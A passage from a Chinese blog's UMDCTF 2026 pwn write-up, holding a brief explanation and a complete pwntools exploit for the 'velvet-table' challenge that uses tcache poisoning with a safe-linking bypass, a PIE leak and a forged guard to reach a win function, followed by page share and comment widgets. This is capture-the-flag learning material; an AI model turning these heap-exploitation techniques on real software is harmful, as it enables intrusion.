+<figure class="wp-block-image"><div class='fancybox-wrapper lazyload-container-unload' data-fancybox='post-images' href='https://cdn.yhalo.cn/UMDCTF2026/umdc40.png'><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  decoding="async" data-original="https://cdn.yhalo.cn/UMDCTF2026/umdc40.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="屏幕截图 2026-05-12 094810"/></div></figure>
+
+
+
+<p class="wp-block-paragraph">把下一次分配落在v55附近，拿到地址减去1b50偏移刚好算出运行时的pie基地址，顺便还可以调整v56满足调用guard</p>
+
+
+
+<p class="wp-block-paragraph">exp</p>
+
+
+
+<pre class="wp-block-code"><code>from pwn import *<br>context(arch='amd64', os='linux', log_level='debug')<br>context.terminal=&#91;'cmd.exe','/c','start','wsl.exe','bash','-c']<br>elf=ELF("velvet-table")<br>io=process("velvet-table")<br>io.recvuntil("table marker:")<br>leak_value=int(io.recvline().strip(),16)<br>shift=leak_value ^ 0x9AC90307<br>leak_addr = 0x7FF000000000 | (((leak_value ^ 0x9AC90307) &amp; 0xffffffff) &lt;&lt; 4)<br>log.info("leak_addr: "+hex(leak_addr))<br>target_addr=leak_addr+0x20<br>log.success(f"target_addr: {hex(target_addr)}")<br>secret = (shift ^ 0x5A17C3D9) &amp; 0xffffffff<br>seat_key = (shift ^ 0x7E) &amp; 0xF<br>​<br>v48= secret&lt;&lt; 32<br>def seat(idx):<br> &nbsp; &nbsp;return((idx-3)&amp;0xf)^seat_key<br>def malloc(idx, size):<br> &nbsp; &nbsp;io.sendlineafter(b"&gt; ",b"1")<br> &nbsp; &nbsp;io.sendlineafter(b"seat: ",str(seat(idx)).encode())<br> &nbsp; &nbsp;io.sendlineafter(b"size: ",str(size).encode())<br>def free(idx):<br> &nbsp; &nbsp;io.sendlineafter(b"&gt; ",b"2")<br> &nbsp; &nbsp;io.sendlineafter(b"seat: ",str(seat(idx)).encode())<br>​<br>def update(idx,data):<br> &nbsp; &nbsp;io.sendlineafter(b"&gt; ",b"3")<br> &nbsp; &nbsp;io.sendlineafter(b"seat: ",str(seat(idx)).encode())<br> &nbsp; &nbsp;io.sendlineafter(b"length: ",str(len(data)).encode())<br> &nbsp; &nbsp;io.sendafter(b"data:\n",data)<br>def show(size,idx):<br> &nbsp; &nbsp;n = min(size, 64)<br> &nbsp; &nbsp;io.sendlineafter(b"&gt; ",b"4")<br> &nbsp; &nbsp;io.sendlineafter(b"seat: ",str(seat(idx)).encode())<br> &nbsp; &nbsp;out = io.recvuntil(b"\n\n1)")<br> &nbsp; &nbsp;io.unrecv(b"\n\n1)")<br> &nbsp; &nbsp;return out&#91;:-4]<br>​<br>def decode_show(data, idx):<br> &nbsp; &nbsp;out = bytearray()<br> &nbsp; &nbsp;base = (idx * 0x45D9F3B) ^ secret<br> &nbsp; &nbsp;for i, b in enumerate(data):<br> &nbsp; &nbsp; &nbsp; &nbsp;r = (idx + i) &amp; 7<br> &nbsp; &nbsp; &nbsp; &nbsp;x = (base ^ (i * 0x9E37)) &amp; 0xffffffff<br> &nbsp; &nbsp; &nbsp; &nbsp;k = (((x &lt;&lt; r) | (x &gt;&gt; (32 - r))) &amp; 0xffffffff) &amp; 0xff<br> &nbsp; &nbsp; &nbsp; &nbsp;out.append(b ^ k)<br> &nbsp; &nbsp;return bytes(out)<br>​<br>​<br>def cancopy():<br> &nbsp; &nbsp;io.sendlineafter(b"&gt; ",b"7")<br>​<br>​<br>malloc(0,0x88)<br>malloc(1,0x88)<br>line = io.recvline().strip()<br>chunk_addr = int(line.split(b": ")&#91;1], 16)<br>log.success(f"chunk_addr: {hex(chunk_addr)}")<br>malloc(2,0x88)<br>malloc(3,0x88)<br>io.recvuntil(b"reservation confirmed:")<br>cancopy()<br>free(0)<br>free(1)<br>safe_linking=p64(target_addr^(chunk_addr&gt;&gt;12))<br>log.success(f"safe_linking: {hex(target_addr^(chunk_addr&gt;&gt;12))}")<br>update(1,safe_linking)<br>malloc(4,0x88)<br>malloc(5,0x88)<br>gdb.attach(io)<br>pause()<br>data=show(0x88,5)<br>leak=decode_show(data,5)<br>func = u64(leak&#91;:8])<br>pie=func-0x1b50<br>win=pie+0x1b60<br>guard=v48^win^0x686F7573655F6564<br>update(5, p64(win)+p64(guard))<br>free(2) &nbsp;#count+1<br>io.sendlineafter(b"&gt; ", b"6")<br>​<br>io.interactive()</code></pre>
+	</div>
+
+	
+	
+	
+			<div class="post-tags">
+			<i class="fa fa-tags" aria-hidden="true"></i>
+			<a href='https://yhalo.cn/tag/ctf/' target='_blank' class='tag badge badge-secondary post-meta-detail-tag'>ctf</a><a href='https://yhalo.cn/tag/pwn/' target='_blank' class='tag badge badge-secondary post-meta-detail-tag'>pwn</a>		</div>
+	</article>
+<div id="share_container">
+	<div id="share" data-initialized="true">
+						<a class="no-pjax icon-wechat" tooltip="分享到微信">
+				<button class="btn btn-icon btn-success">
+					<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
+				</button>
+			</a>
+			<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
+				<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
+					<span aria-hidden="true">豆</span>
+				</button>
+			</a>
+			<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
+				<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
+					<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
+				</button>
+			</a>
+			<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
+				<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
+					<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
+				</button>
+			</a>
+			<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
+				<button class="btn btn-icon btn-warning">
+					<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
+				</button>
+			</a>
+				<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
+			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
+			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
+			</button>
+		</a>
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=yhalo.cn&text=UMDCTF+2026+Pwn+wp+by+YHalo" tooltip="分享到 Telegram">
+			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
+				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
+			</button>
+		</a>
+				<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
+			<button class="btn btn-icon btn-default">
+				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
+			</button>
+		</a>
+	</div>
+	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
+		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
+	</button>
+</div>
+<script type="text/javascript">
+	socialShare("#share", {
+	    title : 'UMDCTF 2026 Pwn wp by YHalo',
+	    description : 'ipv4 这道题是有后门的 调用win()的地方看下 a1不为0.0.0.0，并且要等于100.72…',
+	    wechatQrcodeTitle : "分享到微信",
+	    wechatQrcodeHelper : '微信扫描二维码',
+	    source : 'https://yhalo.cn/1978/umdctf-2026-pwn-wp-by-yhalo/'
+	});
+	$("#share_show")[0].onclick = function(){
+		$("#share_container").addClass("opened");
+	};
+	$("#share_copy_link")[0].onclick = function(){
+		let input = document.createElement('input');
+		document.body.appendChild(input);
+		input.setAttribute("value", window.location.href);
+		input.setAttribute("readonly", "readonly");
+		input.setAttribute("style", "opacity: 0;mouse-events:none;");
+		input.select();
+		if (document.execCommand('copy')){
+			iziToast.show({
+				title: '链接已复制',
+				message: "链接已复制到剪贴板",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#2dce89',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-check',
+				timeout: 5000
+			});
+		}else{
+			iziToast.show({
+				title: '复制失败',
+				message: "请手动复制链接",
+				class: 'shadow',
+				position: 'topRight',
+				backgroundColor: '#f5365c',
+				titleColor: '#ffffff',
+				messageColor: '#ffffff',
+				iconColor: '#ffffff',
+				progressBarColor: '#ffffff',
+				icon: 'fa fa-close',
+				timeout: 5000
+			});
+		}
+		document.body.removeChild(input);
+	};
+</script>
+<div id="comments" class="comments-area card shadow-sm">
+	<div class="card-body">
+					<span>暂无评论</span>
+			</div>
+</div>
+
+
+<div id="post_comment" class="card shadow-sm  no-need-name-email no-need-captcha enable-qq-avatar">
+	<div class="card-body">
+		<h2 class="post-comment-title">
+			<i class="fa fa-commenting"></i>
+			<span class="hide-on-comment-editing">发送评论</span>
+			<span class="hide-on-comment-not-editing">编辑评论</span>
+		</h2>
+		<div id="post_comment_reply_info" class="post-comment-reply" style="display: none;">
+			<span>正在回复 <b><span id="post_comment_reply_name"></span></b> 的评论 :</span>
+			<div id="post_comment_reply_preview" class="post-comment-reply-preview"></div>
+			<button id="post_comment_reply_cancel" class="btn btn-outline-primary btn-sm">取消回复</button>
+		</div>
+		<form>
+			<div class="row">
+				<div class="col-md-12">
+					<textarea id="post_comment_content" class="form-control form-control-alternative" placeholder="评论内容" name="comment" style="height: 80px;"></textarea>
+				</div>
+				<div class="col-md-12" style="height: 0;overflow: hidden;">
+					<pre id="post_comment_content_hidden" class=""></pre>
+				</div>
+			</div>
+						<div class="row hide-on-comment-editing" style="margin-bottom: -10px;">
+				<div class="col-md-6">
+					<div class="form-group">
+						<div class="input-group input-group-alternative mb-4">
+							<div class="input-group-prepend">
+								<span class="input-group-text"><i class="fa fa-user-circle"></i></span>
+							</div>
+							<input id="post_comment_name" class="form-control" placeholder="昵称" type="text" name="author" value="">
+						</div>
+					</div>
+				</div>
+				<div class="col-md-6">
+					<div class="form-group">
+						<div class="input-group input-group-alternative mb-4">
+							<div class="input-group-prepend">
+								<span class="input-group-text"><i class="fa fa-envelope"></i></span>
+							</div>
+							<input id="post_comment_email" class="form-control" placeholder="邮箱 / QQ 号" type="email" name="email" value="">
+						</div>
+					</div>
+				</div>
+				<div class="d-none">
+					<div class="form-group">
+						<div class="input-group input-group-alternative mb-4 post-comment-captcha-container" captcha="8 * 4 = ">
+							<div class="input-group-prepend">
+								<span class="input-group-text"><i class="fa fa-key"></i></span>
+							</div>
+							<input id="post_comment_captcha" class="form-control" placeholder="验证码" type="text" >
+							<style>
+								.post-comment-captcha-container:before{
+									content: attr(captcha);
+								}
+							</style>
+													</div>
+					</div>
+				</div>
+			</div>
+			<div class="row hide-on-comment-editing" id="post_comment_extra_input" style="display: none";>
+				<div class="col-md-12" style="margin-bottom: -10px;">
+					<div class="form-group">
+						<div class="input-group input-group-alternative mb-4 post-comment-link-container">
+							<div class="input-group-prepend">
+								<span class="input-group-text"><i class="fa fa-link"></i></span>
+							</div>
+							<input id="post_comment_link" class="form-control" placeholder="网站" type="text" name="url" value="">
+						</div>
+					</div>
+				</div>
+			</div>
+			<div class="row hide-on-comment-editing " style="margin-top: 10px; ">
+				<div class="col-md-12">
+					<button id="post_comment_toggle_extra_input" type="button" class="btn btn-icon btn-outline-primary btn-sm" tooltip-show-extra-field="展开附加字段" tooltip-hide-extra-field="折叠附加字段">
+						<span class="btn-inner--icon"><i class="fa fa-angle-down"></i></span>
+					</button>
+				</div></div>
+			<div class="row" style="margin-top: 5px; margin-bottom: 10px;">
+				<div class="col-md-12">
+											<div class="custom-control custom-checkbox comment-post-checkbox comment-post-use-markdown">
+							<input class="custom-control-input" id="comment_post_use_markdown" type="checkbox" checked="true">
+							<label class="custom-control-label" for="comment_post_use_markdown">Markdown</label>
+						</div>
+																<div class="custom-control custom-checkbox comment-post-checkbox comment-post-privatemode" tooltip="评论仅发送者和博主可见">
+							<input class="custom-control-input" id="comment_post_privatemode" type="checkbox">
+							<label class="custom-control-label" for="comment_post_privatemode">悄悄话</label>
+						</div>
+																<div class="custom-control custom-checkbox comment-post-checkbox comment-post-mailnotice" tooltip="有回复时邮件通知我">
+							<input class="custom-control-input" id="comment_post_mailnotice" type="checkbox" checked>
+							<label class="custom-control-label" for="comment_post_mailnotice">邮件提醒</label>
+						</div>
+										<button id="post_comment_send" class="btn btn-icon btn-primary comment-btn pull-right mr-0" type="button">
+						<span class="btn-inner--icon hide-on-comment-editing"><i class="fa fa-send"></i></span>
+						<span class="btn-inner--icon hide-on-comment-not-editing"><i class="fa fa-pencil"></i></span>
+						<span class="btn-inner--text hide-on-comment-editing" style="margin-right: 0;">发送</span>
+						<span class="btn-inner--text hide-on-comment-not-editing" style="margin-right: 0;">编辑</span>
+					</button>
+					<button id="post_comment_edit_cancel" class="btn btn-icon btn-danger comment-btn pull-right hide-on-comment-not-editing" type="button" style="margin-right: 8px;">
+						<span class="btn-inner--icon"><i class="fa fa-close"></i></span>
+						<span class="btn-inner--text">取消</span>
+					</button>
+											<button id="comment_emotion_btn" class="btn btn-icon btn-primary pull-right" type="button" title="表情">
+							<i class="fa fa-smile-o" aria-hidden="true"></i>
+						</button>
+						<div id="emotion_keyboard" class="emotion-keyboard card shadow-sm bg-white">
+	<div class="emotion-keyboard-content">
+		<div class='emotion-group' index='0'><div class='emotion-item' text='|´・ω・)ノ' title=''>|´・ω・)ノ</div><div class='emotion-item' text='ヾ(≧∇≦*)ゝ' title=''>ヾ(≧∇≦*)ゝ</div><div class='emotion-item' text='(☆ω☆)' title=''>(☆ω☆)</div><div class='emotion-item' text='（╯‵□′）╯︵┴─┴' title=''>（╯‵□′）╯︵┴─┴</div><div class='emotion-item' text='￣﹃￣' title=''>￣﹃￣</div><div class='emotion-item' text='(/ω＼)' title=''>(/ω＼)</div><div class='emotion-item' text='∠( ᐛ 」∠)＿' title=''>∠( ᐛ 」∠)＿</div><div class='emotion-item' text='(๑•̀ㅁ•́ฅ)' title=''>(๑•̀ㅁ•́ฅ)</div><div class='emotion-item' text='→_→' title=''>→_→</div><div class='emotion-item' text='୧(๑•̀⌄•́๑)૭' title=''>୧(๑•̀⌄•́๑)૭</div><div class='emotion-item' text='٩(ˊᗜˋ*)و' title=''>٩(ˊᗜˋ*)و</div><div class='emotion-item' text='(ノ°ο°)ノ' title=''>(ノ°ο°)ノ</div><div class='emotion-item' text='(´இ皿இ｀)' title=''>(´இ皿இ｀)</div><div class='emotion-item' text='⌇●﹏●⌇' title=''>⌇●﹏●⌇</div><div class='emotion-item' text='(ฅ´ω`ฅ)' title=''>(ฅ´ω`ฅ)</div><div class='emotion-item' text='(╯°A°)╯︵○○○' title=''>(╯°A°)╯︵○○○</div><div class='emotion-item' text='φ(￣∇￣o)' title=''>φ(￣∇￣o)</div><div class='emotion-item' text='ヾ(´･ ･｀｡)ノ&quot;' title=''>ヾ(´･ ･｀｡)ノ&quot;</div><div class='emotion-item' text='( ง ᵒ̌皿ᵒ̌)ง⁼³₌₃' title=''>( ง ᵒ̌皿ᵒ̌)ง⁼³₌₃</div><div class='emotion-item' text='(ó﹏ò｡)' title=''>(ó﹏ò｡)</div><div class='emotion-item' text='Σ(っ °Д °;)っ' title=''>Σ(っ °Д °;)っ</div><div class='emotion-item' text='( ,,´･ω･)ﾉ&quot;(´っω･｀｡)' title=''>( ,,´･ω･)ﾉ&quot;(´っω･｀｡)</div><div class='emotion-item' text='╮(╯▽╰)╭' title=''>╮(╯▽╰)╭</div><div class='emotion-item' text='o(*////▽////*)q' title=''>o(*////▽////*)q</div><div class='emotion-item' text='＞﹏＜' title=''>＞﹏＜</div><div class='emotion-item' text='( ๑´•ω•) &quot;(ㆆᴗㆆ)' title=''>( ๑´•ω•) &quot;(ㆆᴗㆆ)</div></div><div class='emotion-group d-none' index='1'><div class='emotion-item' text='😂' title=''>😂</div><div class='emotion-item' text='😀' title=''>😀</div><div class='emotion-item' text='😅' title=''>😅</div><div class='emotion-item' text='😊' title=''>😊</div><div class='emotion-item' text='🙂' title=''>🙂</div><div class='emotion-item' text='🙃' title=''>🙃</div><div class='emotion-item' text='😌' title=''>😌</div><div class='emotion-item' text='😍' title=''>😍</div><div class='emotion-item' text='😘' title=''>😘</div><div class='emotion-item' text='😜' title=''>😜</div><div class='emotion-item' text='😝' title=''>😝</div><div class='emotion-item' text='😏' title=''>😏</div><div class='emotion-item' text='😒' title=''>😒</div><div class='emotion-item' text='🙄' title=''>🙄</div><div class='emotion-item' text='😳' title=''>😳</div><div class='emotion-item' text='😡' title=''>😡</div><div class='emotion-item' text='😔' title=''>😔</div><div class='emotion-item' text='😫' title=''>😫</div><div class='emotion-item' text='😱' title=''>😱</div><div class='emotion-item' text='😭' title=''>😭</div><div class='emotion-item' text='💩' title=''>💩</div><div class='emotion-item' text='👻' title=''>👻</div><div class='emotion-item' text='🙌' title=''>🙌</div><div class='emotion-item' text='🖕' title=''>🖕</div><div class='emotion-item' text='👍' title=''>👍</div><div class='emotion-item' text='👫' title=''>👫</div><div class='emotion-item' text='👬' title=''>👬</div><div class='emotion-item' text='👭' title=''>👭</div><div class='emotion-item' text='🌚' title=''>🌚</div><div class='emotion-item' text='🌝' title=''>🌝</div><div class='emotion-item' text='🙈' title=''>🙈</div><div class='emotion-item' text='💊' title=''>💊</div><div class='emotion-item' text='😶' title=''>😶</div><div class='emotion-item' text='🙏' title=''>🙏</div><div class='emotion-item' text='🍦' title=''>🍦</div><div class='emotion-item' text='🍉' title=''>🍉</div><div class='emotion-item' text='😣' title=''>😣</div></div><div class='emotion-group d-none' index='2'><div class='emotion-item emotion-item-sticker' code='dinosaur-shy' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/1.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-daze' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/2.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-sweat' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/3.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-proud' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/4.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-powerless' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/5.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-pouting' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/6.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-eating' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/7.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-ok' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/8.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-doubt' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/9.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-depressed' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/10.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-close-eyes' title=''><img class='lazyload' src='data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iZW1vdGlvbi1sb2FkaW5nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIGZpbGw9Im5vbmUiIHZpZXdCb3g9Ii04IC04IDQwIDQwIiBzdHJva2U9IiM4ODgiIG9wYWNpdHk9Ii41IiB3aWR0aD0iNjAiIGhlaWdodD0iNjAiPgogIDxwYXRoIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIgc3Ryb2tlLXdpZHRoPSIxLjUiIGQ9Ik0xNC44MjggMTQuODI4YTQgNCAwIDAxLTUuNjU2IDBNOSAxMGguMDFNMTUgMTBoLjAxTTIxIDEyYTkgOSAwIDExLTE4IDAgOSA5IDAgMDExOCAweiIvPgo8L3N2Zz4=' data-original='https://yhalo.cn/wp-content/themes/argon/stickers/dinosaur/11.jpg'/></div><div class='emotion-item emotion-item-sticker' code='dinosaur-sleeping' title=''><img class='lazyload' 